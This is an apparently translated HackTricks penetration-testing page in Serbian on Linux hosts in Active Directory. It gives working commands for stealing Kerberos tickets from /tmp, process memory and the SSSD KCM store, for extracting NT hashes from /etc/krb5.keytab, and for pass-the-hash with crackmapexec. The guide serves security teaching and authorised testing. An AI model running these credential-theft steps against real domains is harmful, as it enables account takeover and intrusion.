# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

Linux mašina može biti prisutna unutar Active Directory okruženja.

Linux mašina u AD može **čuvati različite CCACHE karte unutar fajlova. Ove karte se mogu koristiti i zloupotrebljavati kao i svaka druga kerberos karta**. Da biste pročitali ove karte, potrebno je da budete korisnik vlasnik karte ili **root** unutar mašine.

## Enumeracija

### AD enumeracija sa linux-a

Ako imate pristup AD-u u linux-u (ili bash-u u Windows-u), možete probati [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) da enumerišete AD.

Takođe možete proveriti sledeću stranicu da biste naučili **druge načine za enumeraciju AD-a sa linux-a**:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA je open-source **alternativa** za Microsoft Windows **Active Directory**, uglavnom za **Unix** okruženja. Kombinuje kompletnu **LDAP direktoriju** sa MIT **Kerberos** Centrom za distribuciju ključeva za upravljanje sličnim Active Directory. Koristi Dogtag **Sistem sertifikata** za upravljanje CA i RA sertifikatima, podržava **višefaktorsku** autentifikaciju, uključujući pametne kartice. SSSD je integrisan za Unix procese autentifikacije. Saznajte više o tome u:

{{#ref}}
../freeipa-pentesting.md
{{#endref}}

## Igranje sa kartama

### Pass The Ticket

Na ovoj stranici ćete pronaći različita mesta gde možete **pronaći kerberos karte unutar linux hosta**, na sledećoj stranici možete naučiti kako da transformišete formate ovih CCache karata u Kirbi (format koji treba da koristite u Windows-u) i takođe kako da izvršite PTT napad:

{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

### CCACHE ponovna upotreba iz /tmp

CCACHE fajlovi su binarni formati za **čuvanje Kerberos akreditiva** i obično se čuvaju sa 600 dozvolama u `/tmp`. Ovi fajlovi se mogu identifikovati po svom **formatu imena, `krb5cc_%{uid}`,** koji se odnosi na korisnikov UID. Za verifikaciju autentifikacione karte, **promenljiva okruženja `KRB5CCNAME`** treba da bude postavljena na putanju željenog fajla karte, omogućavajući njenu ponovnu upotrebu.

Prikazivanje trenutne karte koja se koristi za autentifikaciju sa `env | grep KRB5CCNAME`. Format je prenosiv i karta se može **ponovo koristiti postavljanjem promenljive okruženja** sa `export KRB5CCNAME=/tmp/ticket.ccache`. Format imena kerberos karte je `krb5cc_%{uid}` gde je uid korisnikov UID.
```bash
# Find tickets
ls /tmp/ | grep krb5cc
krb5cc_1000

# Prepare to use it
export KRB5CCNAME=/tmp/krb5cc_1000
```
### CCACHE ponovna upotreba karata iz keyring-a

**Kerberos karte pohranjene u memoriji procesa mogu se izvući**, posebno kada je zaštita ptrace na mašini onemogućena (`/proc/sys/kernel/yama/ptrace_scope`). Koristan alat za ovu svrhu se može pronaći na [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey), koji olakšava ekstrakciju injektovanjem u sesije i dumpovanjem karata u `/tmp`.

Da biste konfigurisali i koristili ovaj alat, slede se koraci u nastavku:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
Ova procedura će pokušati da injektuje u različite sesije, označavajući uspeh čuvanjem ekstrahovanih karata u `/tmp` sa konvencijom imenovanja `__krb_UID.ccache`.

### CCACHE ponovna upotreba karata iz SSSD KCM

SSSD održava kopiju baze podataka na putanji `/var/lib/sss/secrets/secrets.ldb`. Odgovarajući ključ se čuva kao skriveni fajl na putanji `/var/lib/sss/secrets/.secrets.mkey`. Po defaultu, ključ je čitljiv samo ako imate **root** dozvole.

Pozivanje **`SSSDKCMExtractor`** sa parametrima --database i --key će analizirati bazu podataka i **dekriptovati tajne**.
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
**Keš kredencijala Kerberos blob može biti konvertovan u upotrebljiv Kerberos CCache** fajl koji se može proslediti Mimikatz/Rubeus.

### CCACHE ponovna upotreba karte iz keytab-a
```bash
git clone https://github.com/its-a-feature/KeytabParser
python KeytabParser.py /etc/krb5.keytab
klist -k /etc/krb5.keytab
```
### Izvlačenje naloga iz /etc/krb5.keytab

Ključevi servisnog naloga, koji su neophodni za usluge koje rade sa root privilegijama, sigurno su pohranjeni u **`/etc/krb5.keytab`** datotekama. Ovi ključevi, slični lozinkama za usluge, zahtevaju strogu poverljivost.

Da biste pregledali sadržaj keytab datoteke, može se koristiti **`klist`**. Ovaj alat je dizajniran da prikaže detalje o ključevima, uključujući **NT Hash** za autentifikaciju korisnika, posebno kada je tip ključa identifikovan kao 23.
```bash
klist.exe -t -K -e -k FILE:C:/Path/to/your/krb5.keytab
# Output includes service principal details and the NT Hash
```
Za Linux korisnike, **`KeyTabExtract`** nudi funkcionalnost za ekstrakciju RC4 HMAC haša, koji se može iskoristiti za ponovnu upotrebu NTLM haša.
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
Na macOS-u, **`bifrost`** služi kao alat za analizu keytab datoteka.
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
Korišćenjem ekstraktovanih informacija o nalogu i hešu, mogu se uspostaviti veze sa serverima koristeći alate kao što je **`crackmapexec`**.
```bash
crackmapexec 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"
```
## Reference

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory)

{{#include ../../banners/hacktricks-training.md}}
